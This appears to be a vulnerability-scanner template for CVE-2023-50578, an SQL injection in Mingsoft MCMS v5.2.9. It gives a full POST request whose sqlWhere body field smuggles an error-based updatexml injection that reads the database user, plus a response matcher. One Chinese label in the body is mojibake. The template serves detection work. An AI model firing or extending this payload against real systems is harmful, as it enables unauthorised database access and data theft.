id: CVE-2023-50578

info:
  name: SQL Injection in Mingsoft MCMS v5.2.9
  author: ProjectDiscoveryAI
  severity: critical
  description: Mingsoft MCMS v5.2.9 was discovered to contain a SQL injection vulnerability via the categoryType parameter at /content/list.do.

http:
  - method: POST
    path:
      - "{{BaseURL}}/cms/content/list.do"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
      Accept: application/json, text/plain, */*
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
      Cache-Control: no-cache
      Pragma: no-cache
      token: null
      Origin: http://localhost:8080
      Connection: close
      Referer: http://localhost:8080/ms/cms/content/main.do
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
    body: |
      categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20%20current_user)%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22æç« æ é¢%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10
    matchers:
      - type: word
        words:
          - "current_user"
        part: body